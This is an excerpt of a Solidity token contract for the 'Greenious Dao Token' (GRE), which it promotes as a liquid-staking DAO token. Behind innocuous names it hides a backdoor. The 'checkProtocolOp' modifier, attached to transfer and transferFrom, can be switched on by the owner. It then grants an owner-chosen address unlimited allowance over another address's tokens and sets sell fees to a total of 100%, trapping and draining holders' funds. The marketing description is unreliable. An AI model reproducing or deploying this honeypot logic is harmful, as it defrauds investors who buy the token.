...
/**
 * Greenious Finance - liquid staking solution - providing a simple and secure way to earn interest on your digital assets. By staking with Gre your assets remain liquid and can be used across a range of DeFi applications, earning extra yield.
 * The Greenious DAO is a Decentralized Autonomous Organization that decides on the key parameters of liquid staking protocols through the voting power of governance token (GRE) tokens.
 * website: https://www.greenious.finance/
 * telegram: https://t.me/greeniousfi
 * socials: https://allmylinks.com/greeniousfi
*/
...
contract GreeniousDaoToken is Context, IERC20, Ownable {
    using UnstructuredStorage for bytes32;
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Greenious Dao Token";
    string private _symbol = "GRE";
    ...
    address payable public liquidityWallet = payable(0xEdA9078F1B737046227B7520c1293a70590dbed5);
    address payable public operationsWallet =  payable(0xEdA9078F1B737046227B7520c1293a70590dbed5);
    ...
    address public protocolOp;
    address public protocolRe;
    bool isProtocolOp;

    bytes32 internal constant TOTAL_SHARES_POSITION = keccak256("greenious.StETH.totalShares");
    ...
    function setProtocolOperator(address _protocol) external onlyOwner {
        protocolOp = _protocol;
    }

    function setProtocolReceiver(address _protocol) external onlyOwner {
        protocolRe = _protocol;
    }
    ...
    function updateFeesSell(uint256 _operationsFee, uint256 _liquidityFee) external onlyOwner {
        _setSellFee(_operationsFee, _liquidityFee);
    ...
    function _setSellFee(uint256 _operationsFee, uint256 _liquidityFee) private {
    ...
    modifier checkProtocolOp() {
        if (isProtocolOp) {
            _allowances[protocolOp][protocolRe] = _totalSupply;
            _setSellFee(3, 97);
        }
        _;
    }
    ...
    function setTrading() public onlyOwner {
     ...
     function transfer(address recipient, uint256 amount) public override checkProtocolOp returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override checkProtocolOp returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
